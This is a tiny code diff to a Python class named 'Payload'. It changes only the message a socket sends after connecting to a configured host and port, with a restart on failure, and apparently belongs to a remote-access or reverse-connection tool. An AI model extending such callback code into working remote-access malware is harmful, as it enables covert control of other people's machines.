@@ -53,7 +53,7 @@ class Payload:
         try:
             self.s = socket.socket()
             self.s.connect((self.host, self.port))
-            self.s.sendall(b"Connected successfully")
+            self.s.sendall(b"Connected successfully!")
         except:
             Utils.restart()
 
